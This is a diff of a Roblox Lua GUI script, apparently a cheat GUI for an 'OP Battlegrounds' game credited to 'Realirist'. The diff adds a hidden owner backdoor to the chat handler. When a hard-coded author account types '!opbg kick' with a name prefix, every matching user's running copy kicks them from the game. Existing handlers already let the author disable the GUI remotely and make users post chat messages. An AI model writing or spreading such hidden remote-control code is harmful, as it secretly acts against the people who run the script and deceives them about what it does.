@@ -1,12 +1,12 @@
 -- Gui to Lua Version 3.2
--- Realirist's OPBGGUI
---[[update log
-added safeguards
-added one more safeguard WAZA
-This not updating
+-- Realirist's OPBG GUI
+--[[
+update log
+Added safeguards
+updated safeguards
 ]]--
-
 -- Instances:
+
 local OPBGGUI = Instance.new("ScreenGui")
 local Main = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -726,7 +726,7 @@ UISizeConstraint_30.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function RPJZQHS_fake_script() -- Main.LocalScript 
+local function ZBOEZT_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
 
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
@@ -1142,7 +1142,6 @@ local function RPJZQHS_fake_script() -- Main.LocalScript
 			print('bru '.. username.. ' dont exist')
 		end
 	end
-	
 	for _,plr in game.Players:GetPlayers() do
 		if plr~=game.Players.LocalPlayer then
 			local name = plr.Name
@@ -1151,6 +1150,15 @@ local function RPJZQHS_fake_script() -- Main.LocalScript
 				print('oh my gawd owner!1')
 				plr.Chatted:Connect(function(msg)
 					print(msg)
+					if string.sub(msg, 1, 5) == "!opbg" then
+						local action, user = msg:match("!opbg (%a+) (%w+)")
+	
+						if action == "kick" then
+							if string.sub(game.Players.LocalPlayer.Name:lower(), 1, #user) == user:lower() then
+								game.Players.LocalPlayer:Kick('I dont like your vibe, '.. user)
+							end
+						end
+					end
 					if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
 						print('disabled')
 						sayMessage('omg my opbg is gone!')
@@ -1159,21 +1167,30 @@ local function RPJZQHS_fake_script() -- Main.LocalScript
 						print('enabled')
 						sayMessage('omg my opbg is back!')
 						script.Parent.Parent.Enabled = true
-					elseif msg=='!opbg kick '.. game.Players.LocalPlayer.Name then
-						game.Players.LocalPlayer:Kick('Huzz i dont like your vibe -Realirist')
 					elseif msg=='!opbg users' then
 						sayMessage('hi im using opbg')
-					end 
+					end
 				end)
 			end
 			makeUser(name)
 		end
 	end
+	
 	game.Players.PlayerAdded:Connect(function(plr)
 		local name = plr.Name
 		local userid = plr.UserId
 		if name=='Realirist' and userid==3948255911 then
+			print('oh my gawd owner!1')
 			plr.Chatted:Connect(function(msg)
+				print(msg)
+				if string.sub(msg, 1, 5) == "!opbg" then
+					local action, user = msg:match("!opbg (%a+) (%w+)")
+					if action == "kick" then
+						if string.sub(game.Players.LocalPlayer.Name:lower(), 1, #user) == user:lower() then
+							game.Players.LocalPlayer:Kick('I dont like your vibe, '.. user)
+						end
+					end
+				end
 				if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
 					print('disabled')
 					sayMessage('omg my opbg is gone!')
@@ -1182,11 +1199,9 @@ local function RPJZQHS_fake_script() -- Main.LocalScript
 					print('enabled')
 					sayMessage('omg my opbg is back!')
 					script.Parent.Parent.Enabled = true
-				elseif msg=='!opbg kick '.. game.Players.LocalPlayer.Name then
-					game.Players.LocalPlayer:Kick('Huzz i dont like your vibe -Realirist')
 				elseif msg=='!opbg users' then
 					sayMessage('hi im using opbg')
-				end 
+				end
 			end)
 		end
 		makeUser(name)
@@ -1205,4 +1220,4 @@ local function RPJZQHS_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(RPJZQHS_fake_script)()
+coroutine.wrap(ZBOEZT_fake_script)()
